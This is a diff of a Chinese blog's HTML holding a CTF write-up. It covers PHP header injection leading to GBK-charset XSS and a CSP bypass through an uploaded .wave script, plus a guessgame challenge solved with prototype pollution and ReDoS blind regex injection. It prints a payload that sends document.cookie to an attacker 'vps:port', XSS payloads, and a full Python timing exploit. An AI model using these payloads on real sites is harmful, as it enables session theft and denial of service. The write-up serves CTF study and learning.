class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;after) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;location))&#123;</span><br><span class="line">		$dest = <span class="keyword">$this</span>-&gt;pre . <span class="keyword">$this</span>-&gt;location . <span class="keyword">$this</span>-&gt;after;</span><br><span class="line">		header($dest);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">// Error occured?</span></span><br><span class="line">		header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;location !== <span class="keyword">$this</span>-&gt;page)&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;go();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ob_end_flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">    function go(){
+        if(isset($this-&gt;pre) and isset($this-&gt;after) and isset($this-&gt;location)){
+            $dest = $this-&gt;pre . $this-&gt;location . $this-&gt;after;
+            header($dest);
+        }
+        else{
+            // Error occured?
+            header(&quot;Location: index.php&quot;);
+        }
+    }
 
+    function __destruct(){
+        if($this-&gt;flag){
+            if($this-&gt;location !== $this-&gt;page){
+                $this-&gt;go();
+            }
+        }
+        ob_end_flush();
+    }</code></pre>
 <p>一个<code>destruct</code>方法，在flag为true时会调用<code>go</code>，然后，go很奇妙的拼接了三个参数进行<code>header()</code>设计。<br>那么是否只要我们把header控制为gbk编码，就可以解决前面xss被转义的问题呢？没错。所以这里就是入手点。转而跟进下关键函数。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($user-&gt;url-&gt;referer !&#x3D; $user-&gt;url-&gt;page)&#123;</span><br><span class="line">            $user-&gt;url-&gt;location &#x3D; $user-&gt;url-&gt;referer;</span><br><span class="line">        &#125;</span><br><span class="line">        $user-&gt;url-&gt;flag &#x3D; True;</span><br></pre></td></tr></table></figure>
-<p>首先，传值answer时就会进行flag=1赋值，同时location参数会赋值为我们可控的referer。那么我们的目标变成通过referer控制header。<br>为此就要解决<code>pre</code>这个拼接的属性。这时我们前面的eval语句就起作用了。如果把<code>this-&gt;pre</code>设为false,在拼接时它就会变成空。那么我们的可控参数location直接传进header。<br>既然如此，payload就可以构造了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?answer&#x3D;user-&gt;url-&gt;pre&amp;referer&#x3D;Content-Type:text&#x2F;html; charset&#x3D;GBK;abc&#x3D;</span><br></pre></td></tr></table></figure>
-<p>此处随便用<code>abc</code>之类的拼接下后面的<code>this-&gt;after</code>属性值.php。<br>这样我们的index.php终于可以打xss了，可以逃逸单引号。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?message&#x3D;%c0%27; alert(1);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-<p>现在想来我比赛时就是这么打的。但是<code>alert(1)</code>没成，我以为是payload问题就没继续做了…….现在想想实在是拉胯，这个payload就没问题啊，估计是我哪里细节有问题啊，应该继续做下去的，草。<br>然后就是常规问题了，为了解决没有单引号的问题使用string.fromCharCode，这个我也预先想好了这样写payload，居然因为提前放弃没用出来，该打。<br>然后就可以加载内联脚本了。同样很简单，因为CSP的原因吧src设置成上传文件路径即可。这里我看梅子酒学长的文章介绍的是用.wave文件bypassCSP的。不过之前看过文章介绍过jpeg或者其他文件bypassCSP也是可行的。不过需要设计一下文件头。<br>所以payload构造下：<br>上传图片内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaa&#x2F;*bbbbbbbbbbbbbbbbbbb*&#x2F;&#x3D;&#39;test&#39;;window.open(&#39;http:&#x2F;&#x2F;vps:port&#x2F;?&#39;+document.cookie);</span><br></pre></td></tr></table></figure>
-<p>index.php构造message</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%c0%<span class="number">27</span>; </span><br><span class="line"><span class="keyword">var</span> x=<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">x.src=<span class="string">'/upload/xxxxx/test.wave'</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(x);<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<pre><code>if($user-&gt;url-&gt;referer != $user-&gt;url-&gt;page){
+            $user-&gt;url-&gt;location = $user-&gt;url-&gt;referer;
+        }
+        $user-&gt;url-&gt;flag = True;</code></pre><p>首先，传值answer时就会进行flag=1赋值，同时location参数会赋值为我们可控的referer。那么我们的目标变成通过referer控制header。<br>为此就要解决<code>pre</code>这个拼接的属性。这时我们前面的eval语句就起作用了。如果把<code>this-&gt;pre</code>设为false,在拼接时它就会变成空。那么我们的可控参数location直接传进header。<br>既然如此，payload就可以构造了：</p>
+<pre><code>/?answer=user-&gt;url-&gt;pre&amp;referer=Content-Type:text/html; charset=GBK;abc=</code></pre><p>此处随便用<code>abc</code>之类的拼接下后面的<code>this-&gt;after</code>属性值.php。<br>这样我们的index.php终于可以打xss了，可以逃逸单引号。</p>
+<pre><code>/index.php?message=%c0%27; alert(1);//</code></pre><p>现在想来我比赛时就是这么打的。但是<code>alert(1)</code>没成，我以为是payload问题就没继续做了…….现在想想实在是拉胯，这个payload就没问题啊，估计是我哪里细节有问题啊，应该继续做下去的，草。<br>然后就是常规问题了，为了解决没有单引号的问题使用string.fromCharCode，这个我也预先想好了这样写payload，居然因为提前放弃没用出来，该打。<br>然后就可以加载内联脚本了。同样很简单，因为CSP的原因吧src设置成上传文件路径即可。这里我看梅子酒学长的文章介绍的是用.wave文件bypassCSP的。不过之前看过文章介绍过jpeg或者其他文件bypassCSP也是可行的。不过需要设计一下文件头。<br>所以payload构造下：<br>上传图片内容</p>
+<pre><code>aaaaaaaaaaaaaaa/*bbbbbbbbbbbbbbbbbbb*/=&#39;test&#39;;window.open(&#39;http://vps:port/?&#39;+document.cookie);</code></pre><p>index.php构造message</p>
+<pre><code class="javascript">%c0%27; 
+var x=document.createElement(&#39;script&#39;);
+x.src=&#39;/upload/xxxxx/test.wave&#39;
+document.body.appendChild(x);//</code></pre>
 <p>最后payload转一下charcode应该就行了。</p>
 <p>这里再膜一下星盟跟Nu1L等等战队的师傅们，整了个巨简单的非预期。上面eval覆盖的地方由于前面调用了一个clone，所以相当于是个新的user。这样的话user的属性都可以改。由于源码所有功能都在user类实现的，那就是任意属性都可改。直接把黑名单覆盖成false.然后上传phpgetshell。flag在根目录……<br>郁师傅最后也跟我说这个思路，我开始还不敢信。结果真能整成非预期。可惜后来被修复了。</p>
 <p>不说了，比赛没做出来太遗憾了。有复现环境的话一定去复现。</p>
 <h1 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h1><p>先扔一个源码审完就出的payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;user&quot;: &#123;&quot;username&quot;:&quot;admın888&quot;, &quot;__proto__&quot;: &#123;&quot;enableReg&quot;: True&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure>
-<p>主要是一个js大写的绕过，上次公益CTF做过了。然后是一个调用了merge的原型链污染。也是为了进下面这个if。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123;</span><br><span class="line">            <span class="comment">//res.end(flag);</span></span><br><span class="line">            <span class="comment">//Stop your wishful thinking and go away!</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<pre><code>{&quot;user&quot;: {&quot;username&quot;:&quot;admın888&quot;, &quot;__proto__&quot;: {&quot;enableReg&quot;: True}}}) </code></pre><p>主要是一个js大写的绕过，上次公益CTF做过了。然后是一个调用了merge的原型链污染。也是为了进下面这个if。</p>
+<pre><code class="javascript">if(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp)){
+            //res.end(flag);
+            //Stop your wishful thinking and go away!
+        }</code></pre>
 <p>后面要跑flag，用的是正则盲注。<br>打扰了，环境一个个卡的一比。我也不知道怎么注，<del>等一手官方wp吧。</del><br>看到别队思路了，可以学下。原来noDos这个正则就是要利用的。因为是个正则匹配，而javascript正则的回溯机制会让恶意代码使服务端大量占用服务内存。比如一个<code>/ˆa*a*b$/</code>，用<code>aaaaaaaaaaaaa</code>就可以让其多次回溯，达成js的re(正则)dos攻击。<br>所以本题目的就是让nodos被我们的可控q卡住，然后前面已经原型链污染达成if的一个真值了，剩下的相当于盲注flag使if第三个值达成真值。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> g3t(((((.*)+)+)+)+)! </span><br><span class="line">(((((.*)+)+)+)+)Y</span><br></pre></td></tr></table></figure>
-<p>类似如此的payload不断fuzz。</p>
+<pre><code> g3t(((((.*)+)+)+)+)! 
+(((((.*)+)+)+)+)Y</code></pre><p>类似如此的payload不断fuzz。</p>
 <p>3.13：<br>今天把题目复现了一下，用的出题人的脚本做了做。顺便理解了下reDOS盲注的基本概念。当然要跟出题人点赞，这题算是头一次考察了reDOS的知识点，可惜因为靶机原因不能保证选手们正常解题。如果单独下发容器应该会更稳定。<br>关于知识点:<br>说起来其实不难。reDOS首先需要明确的是：使用了js的NFA作为正则引擎。NFA，即非确定有限状态自动机。其实，之前在p牛的pcrewaf这一题目中就已经提及了NFA的特性。它正则匹配时出现的回溯机制将会产生大量危害。对php而言是回溯次数有限导致bypass。对作为服务端的js而言，则是占用大量系统资源。之前曾看到国外大佬写的一个正则，可以让一次js的正则匹配占用高达%99的内存。</p>
 <p>回到这一知识点，来看解题的主要正则</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(?&#x3D;(some regexp here))((.*)*)*salt$</span><br></pre></td></tr></table></figure>
-<p>简单解释，只要我们所需要的SECRET(本题是flag)与中间的regexp部分相匹配，整个正则将导致整个匹配过程延时到2秒多的时间。既然如此，只要能通过构造正则表达式来注入，将达到跟sql时间盲注一样的效果，得到进行正则匹配的flag<br>附上出题人的exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># constants</span></span><br><span class="line">THRESHOLD = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># predicates</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">length_is</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">".&#123;"</span> + str(n) + <span class="string">"&#125;$"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nth_char_is</span><span class="params">(n, c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">".&#123;"</span> + str(n<span class="number">-1</span>) + <span class="string">"&#125;"</span> + re.escape(c) + <span class="string">".*$"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># utilities</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redos_if</span><span class="params">(regexp, salt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"^(?=&#123;&#125;)((((.*)*)*)*)*&#123;&#125;"</span>.format(regexp, salt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_request_duration</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _start = time.time()</span><br><span class="line">        requests.post(<span class="string">"http://vps:port/verifyFlag"</span>, &#123;<span class="string">"q"</span>: payload&#125;)</span><br><span class="line">        _end = time.time()</span><br><span class="line">        duration = _end - _start</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        duration = <span class="number">-1</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> duration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prop_holds</span><span class="params">(prop, salt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> get_request_duration(redos_if(prop, salt)) &gt; THRESHOLD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_salt</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([random.choice(string.ascii_letters) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    salt = <span class="string">"!"</span>  <span class="comment"># generate_salt()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak length</span></span><br><span class="line">    upper_bound = <span class="number">15</span></span><br><span class="line">    secret_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, upper_bound):</span><br><span class="line">        <span class="keyword">if</span> prop_holds(length_is(i), salt):</span><br><span class="line">            secret_length = i</span><br><span class="line">    print(<span class="string">"[+] length: &#123;&#125;"</span>.format(secret_length))</span><br><span class="line"></span><br><span class="line">    S = <span class="string">"qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890"</span></span><br><span class="line">    secret = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, secret_length):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">if</span> prop_holds(nth_char_is(i+<span class="number">1</span>, c), salt):</span><br><span class="line">                secret += c</span><br><span class="line">                print(<span class="string">"[*] &#123;&#125;"</span>.format(secret))</span><br><span class="line">    print(<span class="string">"[+] secret: &#123;&#125;"</span>.format(secret))</span><br></pre></td></tr></table></figure>
+<pre><code>^(?=(some regexp here))((.*)*)*salt$</code></pre><p>简单解释，只要我们所需要的SECRET(本题是flag)与中间的regexp部分相匹配，整个正则将导致整个匹配过程延时到2秒多的时间。既然如此，只要能通过构造正则表达式来注入，将达到跟sql时间盲注一样的效果，得到进行正则匹配的flag<br>附上出题人的exp:</p>
+<pre><code class="python">import socket
+import sys
+import time
+import random
+import string
+import requests
+import re
+
+# constants
+THRESHOLD = 2
+
+# predicates
+
+
+def length_is(n):
+    return &quot;.{&quot; + str(n) + &quot;}$&quot;
+
+
+def nth_char_is(n, c):
+    return &quot;.{&quot; + str(n-1) + &quot;}&quot; + re.escape(c) + &quot;.*$&quot;
+
+# utilities
+
+
+def redos_if(regexp, salt):
+    return &quot;^(?={})((((.*)*)*)*)*{}&quot;.format(regexp, salt)
+
+
+def get_request_duration(payload):
+    try:
+        _start = time.time()
+        requests.post(&quot;http://vps:port/verifyFlag&quot;, {&quot;q&quot;: payload})
+        _end = time.time()
+        duration = _end - _start
+    except:
+        duration = -1
+        exit(1)
+    return duration
+
+
+def prop_holds(prop, salt):
+    return get_request_duration(redos_if(prop, salt)) &gt; THRESHOLD
+
+
+def generate_salt():
+    return &#39;&#39;.join([random.choice(string.ascii_letters) for i in range(10)])
+
+
+if __name__ == &#39;__main__&#39;:
+    salt = &quot;!&quot;  # generate_salt()
+
+    # leak length
+    upper_bound = 15
+    secret_length = 0
+    for i in range(0, upper_bound):
+        if prop_holds(length_is(i), salt):
+            secret_length = i
+    print(&quot;[+] length: {}&quot;.format(secret_length))
+
+    S = &quot;qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890&quot;
+    secret = &quot;&quot;
+    for i in range(0, secret_length):
+        for c in S:
+            if prop_holds(nth_char_is(i+1, c), salt):
+                secret += c
+                print(&quot;[*] {}&quot;.format(secret))
+    print(&quot;[+] secret: {}&quot;.format(secret))</code></pre>
 <p>参考了出题人的参考文章：<a href="https://diary.shift-js.info/blind-regular-expression-injection/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://diary.shift-js.info/blind-regular-expression-injection/?tdsourcetag=s_pctim_aiomsg</a> </p>
 <p>比赛其他题目主要是队友做的，基本没怎么看。到时候有机会去研究下。<br>然后就是反思了。现在水平还太菜，赶紧多花点时间学学知识刷刷题。不然再菜的抠脚就丢人了。</p>
 
@@ -739,7 +946,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -751,9 +958,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -886,6 +1093,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1099,7 +1308,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1155,6 +1364,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
